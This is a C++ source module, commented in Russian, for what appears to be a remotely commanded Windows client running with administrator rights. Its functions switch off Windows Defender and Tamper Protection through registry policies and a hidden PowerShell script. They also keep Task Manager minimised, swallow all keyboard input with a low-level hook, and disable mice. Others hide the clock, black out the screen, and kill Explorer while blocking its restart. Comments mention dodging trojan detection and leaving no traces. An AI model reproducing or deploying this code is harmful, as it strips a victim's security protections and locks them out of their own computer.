// Вкладка «Прочее»: отключение диспетчера задач, Defender, мыши, часов,
// экрана, клавиатуры и оболочки Explorer. Все функции — с возвратом назад.
//
// Примечания:
//  - HKLM-записи и PnP-устройства требуют прав администратора (клиент запущен
//    через start_elevated.cmd, поэтому реестр и устройства доступны).
//  - Состояние хранится в памяти клиента и отдаётся командой miscstatus.
#define NOMINMAX

#include "misc.h"

#include <windows.h>
#include <shellapi.h>

#include <atomic>
#include <cstdio>
#include <map>
#include <string>
#include <thread>
#include <vector>

// --------------------------------------------------------------- состояние --
static std::map<std::string, bool> g_misc; // func -> on (память клиента)

std::string miscStateJson() {
    const char* funcs[] = {"taskmgr", "defender", "mouse", "clock",
                           "screen",  "keyboard", "explorer"};
    std::string out = "{";
    bool first = true;
    for (const char* f : funcs) {
        bool v = g_misc.count(f) ? g_misc[f] : false;
        if (!first) out += ",";
        first = false;
        out += std::string("\"") + f + "\":" + (v ? "true" : "false");
    }
    out += "}";
    return out;
}

// --------------------------------------------------------------- реестр -----
static bool regWriteDword(HKEY hRoot, const std::wstring& sub,
                          const wchar_t* name, DWORD value) {
    HKEY hk = nullptr;
    LONG r = RegCreateKeyExW(hRoot, sub.c_str(), 0, nullptr, 0,
                             KEY_SET_VALUE, nullptr, &hk, nullptr);
    if (r != ERROR_SUCCESS) return false;
    r = RegSetValueExW(hk, name, 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
    RegCloseKey(hk);
    return r == ERROR_SUCCESS;
}

static void regDeleteValue(HKEY hRoot, const std::wstring& sub,
                           const wchar_t* name) {
    HKEY hk = nullptr;
    if (RegOpenKeyExW(hRoot, sub.c_str(), 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
        return; // ключа нет — уже «выключено»
    RegDeleteValueW(hk, name);
    RegCloseKey(hk);
}
// --------------------------------------------------------------- команды ----
// Выполняет тело скрипта через powershell -File (временный .ps1).
static bool runPs(const std::string& body, std::string& err) {
    wchar_t tmp[MAX_PATH];
    if (!GetTempPathW(MAX_PATH, tmp)) { err = "no temp dir"; return false; }
    std::wstring file = std::wstring(tmp) + L"fm_misc_action.ps1";
    HANDLE h = CreateFileW(file.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) { err = "cannot create temp script"; return false; }
    DWORD wr = 0;
    // UTF-8 с BOM: PowerShell 5.1 без BOM читает файл как ANSI.
    const char bom[3] = {(char)0xEF, (char)0xBB, (char)0xBF};
    WriteFile(h, bom, 3, &wr, nullptr);
    WriteFile(h, body.data(), (DWORD)body.size(), &wr, nullptr);
    CloseHandle(h);

    std::wstring cmd = L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass "
                       L"-WindowStyle Hidden -File \"" + file + L"\"";
    std::vector<wchar_t> cmdline(cmd.begin(), cmd.end());
    cmdline.push_back(0);
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, cmdline.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        DeleteFileW(file.c_str());
        err = "cannot run powershell";
        return false;
    }
    WaitForSingleObject(pi.hProcess, 90000);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    DeleteFileW(file.c_str());
    if (code != 0) { err = "powershell exit " + std::to_string(code); return false; }
    return true;
}

// Запуск команды без ожидания (в фоне). Возвращает false, если процесс не создан.
static bool spawnDetached(const std::wstring& cmdline) {
    std::vector<wchar_t> c(cmdline.begin(), cmdline.end());
    c.push_back(0);
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, c.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return false;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// Перезапуск оболочки: применяет политики панели задач (HideClock) мгновенно.
static void explorerRestart() {
    spawnDetached(L"taskkill.exe /f /im explorer.exe");
    Sleep(600);
    ShellExecuteW(nullptr, L"open", L"explorer.exe", nullptr, nullptr, SW_SHOWNORMAL);
}
// ------------------------------------------------- диспетчер задач ---------
// Простой и надёжный способ запрета: поток каждые 2 мс находит окно диспетчера
// задач и сворачивает его (реестровая политика DisableTaskMgr не работает на
// свежих Windows и не даёт понять, что окно «открылось»).
static std::atomic<bool> g_taskmgrWatch{false};
static std::thread g_taskmgrThread;

static BOOL CALLBACK findTaskmgrWindow(HWND hwnd, LPARAM) {
    wchar_t cls[64];
    if (GetClassNameW(hwnd, cls, 64) == 0) return TRUE;
    if (wcscmp(cls, L"TaskManagerWindow") == 0 ||
        wcscmp(cls, L"TaskManagerWindowClass") == 0 ||
        wcsstr(cls, L"Taskmgr") != nullptr) {
        ShowWindow(hwnd, SW_MINIMIZE);
    }
    return TRUE;
}

static void taskmgrWatchLoop() {
    int tick = 0;
    while (g_taskmgrWatch.load()) {
        // Быстрый путь: класс окна диспетчера задач.
        HWND hwnd = FindWindowW(L"TaskManagerWindow", nullptr);
        if (!hwnd) hwnd = FindWindowW(L"TaskManagerWindowClass", nullptr);
        if (hwnd) {
            ShowWindow(hwnd, SW_MINIMIZE);
        } else if (++tick % 50 == 0) {
            // fallback по любому окну с классом Taskmgr (каждые ~100 мс)
            EnumWindows(findTaskmgrWindow, 0);
        }
        Sleep(2); // каждые 2 мс — пока окно не откроется повторно
    }
}

static void taskmgrWatchStart() {
    if (g_taskmgrThread.joinable()) return;
    g_taskmgrWatch = true;
    g_taskmgrThread = std::thread(taskmgrWatchLoop);
}

static void taskmgrWatchStop() {
    g_taskmgrWatch = false;
    if (g_taskmgrThread.joinable()) g_taskmgrThread.join();
}
// ------------------------------------------------------ клавиатура ----------
// PnP-отключение клавиатур (Disable-PnpDevice/SetupAPI) на многих системах
// не работает (HRESULT 0x8004100c, "операция не поддерживается"). Вместо этого
// блокируем ввод низкоуровневым хуком WH_KEYBOARD_LL прямо в клиенте:
// события клавиатуры поглощаются, ничего не доходит до окон. Мгновенно
// включается и выключается, не трогает устройства.
static std::atomic<bool> g_kbdBlocked{false};
static HHOOK g_kbdHook = nullptr;
static std::thread g_kbdThread;
static DWORD g_kbdThreadId = 0;

static LRESULT CALLBACK kbdHookProc(int nCode, WPARAM, LPARAM) {
    if (nCode == HC_ACTION) return 1; // проглотить событие
    return CallNextHookEx(g_kbdHook, nCode, 0, 0);
}

static void kbdBlockLoop() {
    g_kbdThreadId = GetCurrentThreadId();
    g_kbdHook = SetWindowsHookExW(WH_KEYBOARD_LL, kbdHookProc,
                                  GetModuleHandleW(nullptr), 0);
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    if (g_kbdHook) {
        UnhookWindowsHookEx(g_kbdHook);
        g_kbdHook = nullptr;
    }
}

static bool kbdBlockStart() {
    if (g_kbdThread.joinable()) return true;
    g_kbdBlocked = true;
    g_kbdThread = std::thread(kbdBlockLoop);
    Sleep(50);
    if (!g_kbdHook) {
        g_kbdBlocked = false;
        if (g_kbdThread.joinable()) {
            PostThreadMessageW(g_kbdThreadId, WM_QUIT, 0, 0);
            g_kbdThread.join();
        }
        return false;
    }
    return true;
}

static void kbdBlockStop() {
    g_kbdBlocked = false;
    if (g_kbdThread.joinable()) {
        if (g_kbdHook) {
            UnhookWindowsHookEx(g_kbdHook);
            g_kbdHook = nullptr;
        }
        PostThreadMessageW(g_kbdThreadId, WM_QUIT, 0, 0);
        g_kbdThread.join();
    }
}

// ------------------------------------------------------------------- логика --
bool miscApply(const std::string& func, bool on, std::string& err) {
    if (func == "taskmgr") {
        // Диспетчер задач сворачивается при каждом открытии (каждые 2 мс).
        // Реестровая политика не используется — она может не сработать.
        if (on) taskmgrWatchStart();
        else taskmgrWatchStop();
    } else if (func == "defender") {
        // Штатный путь отключения: Set-MpPreference (включая DisableTamperProtection).
        // Службы через sc.exe НЕ трогаем — детектится как троян.
        // В конце скрипта проверяем реальное состояние: если защита не
        // отключилась (Tamper Protection включена и не дала снять себя) —
        // возвращаем ошибку, а не ложный успех.
        const wchar_t* sub = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender";
        if (on) {
            regWriteDword(HKEY_LOCAL_MACHINE, sub, L"DisableAntiSpyware", 1);
            regWriteDword(HKEY_LOCAL_MACHINE, sub, L"DisableAntiVirus", 1);
            regWriteDword(HKEY_LOCAL_MACHINE, sub, L"DisableRealtimeMonitoring", 1);
            std::string ps =
                "$ErrorActionPreference='Stop'; "
                "try { Set-MpPreference -DisableTamperProtection $true "
                "-DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true "
                "-DisableBlockAtFirstSeen $true -DisableIOAVProtection $true "
                "-DisableOnAccessProtection $true -DisableScanOnRealtimeEnable $true "
                "-ErrorAction Stop } catch {} "
                "if ((Get-MpComputerStatus -ErrorAction SilentlyContinue).RealTimeProtectionEnabled) { exit 1 }";
            std::string perr;
            if (!runPs(ps, perr)) {
                // Не оставляем следов: снимаем политики, если отключить не удалось.
                regDeleteValue(HKEY_LOCAL_MACHINE, sub, L"DisableAntiSpyware");
                regDeleteValue(HKEY_LOCAL_MACHINE, sub, L"DisableAntiVirus");
                regDeleteValue(HKEY_LOCAL_MACHINE, sub, L"DisableRealtimeMonitoring");
                err = "Защитник Windows не удалось отключить: включена защита от "
                      "несанкционированного доступа (Tamper Protection). Отключите её "
                      "вручную: Защитник Windows -> Защита от вирусов и угроз -> "
                      "Параметры защиты от вирусов и угроз -> Защита от несанкционированного доступа";
                return false;
            }
        } else {
            regDeleteValue(HKEY_LOCAL_MACHINE, sub, L"DisableAntiSpyware");
            regDeleteValue(HKEY_LOCAL_MACHINE, sub, L"DisableAntiVirus");
            regDeleteValue(HKEY_LOCAL_MACHINE, sub, L"DisableRealtimeMonitoring");
            std::string ps =
                "$ErrorActionPreference='Stop'; "
                "try { Set-MpPreference -DisableTamperProtection $false "
                "-DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false "
                "-DisableBlockAtFirstSeen $false -DisableIOAVProtection $false "
                "-DisableOnAccessProtection $false -DisableScanOnRealtimeEnable $false "
                "-ErrorAction Stop } catch {}";
            std::string perr;
            if (!runPs(ps, perr)) {
                err = "не удалось вернуть Защитник Windows (ошибка PowerShell)";
                return false;
            }
        }
    } else if (func == "mouse") {
        // Status 'Unknown' бывает у устройств без драйвера — включаем и их,
        // иначе «Включить мышь обратно» не найдёт отключённое устройство.
        // Без SilentlyContinue: ошибка прав должна быть видна клиенту.
        std::string ps = on
            ? "Get-PnpDevice -Class Mouse | Where-Object { $_.Status -in @('OK','Unknown') } "
              "| Disable-PnpDevice -Confirm:$false -ErrorAction Stop"
            : "Get-PnpDevice -Class Mouse | Where-Object { $_.Status -notin @('OK','Unknown') } "
              "| Enable-PnpDevice -Confirm:$false -ErrorAction Stop";
        if (!runPs(ps, err)) return false;
    } else if (func == "keyboard") {
        // PnP-отключение на многих системах не поддерживается — блокируем
        // ввод хуком WH_KEYBOARD_LL (надёжно на любом Windows).
        if (on) {
            if (!kbdBlockStart()) {
                err = "не удалось установить хук клавиатуры";
                return false;
            }
        } else {
            kbdBlockStop();
        }
    } else if (func == "clock") {
        // HKCU ...\Policies\Explorer\HideClock = 1/удалить + перезапуск трея
        const wchar_t* sub = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer";
        if (on) {
            if (!regWriteDword(HKEY_CURRENT_USER, sub, L"HideClock", 1)) {
                err = "registry write failed";
                return false;
            }
        } else {
            regDeleteValue(HKEY_CURRENT_USER, sub, L"HideClock");
        }
        explorerRestart();
    } else if (func == "screen") {
        // SC_MONITORPOWER: 2 = выключить монитор (чёрный), -1 = включить.
        SendMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER,
                     on ? (WPARAM)2 : (WPARAM)-1);
        Sleep(300);
    } else if (func == "explorer") {
        // Windows по умолчанию сама перезапускает explorer после taskkill
        // (Winlogon AutoRestartShell). Чтобы оболочка оставалась остановленной,
        // временно запрещаем автозапуск; при возврате — снимаем запрет.
        const wchar_t* winlogon = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
        if (on) {
            if (!regWriteDword(HKEY_CURRENT_USER, winlogon, L"AutoRestartShell", 0)) {
                err = "registry write failed";
                return false;
            }
            spawnDetached(L"taskkill.exe /f /im explorer.exe");
        } else {
            regDeleteValue(HKEY_CURRENT_USER, winlogon, L"AutoRestartShell");
            ShellExecuteW(nullptr, L"open", L"explorer.exe", nullptr, nullptr, SW_SHOWNORMAL);
        }
    } else {
        err = "unknown function";
        return false;
    }
    g_misc[func] = on;
    return true;
}

bool miscKillTaskmgr(std::string& err) {
    // Закрыть диспетчер задач без изменения состояния
    if (!spawnDetached(L"taskkill.exe /f /im taskmgr.exe")) {
        err = "cannot run taskkill";
        return false;
    }
    return true;
}
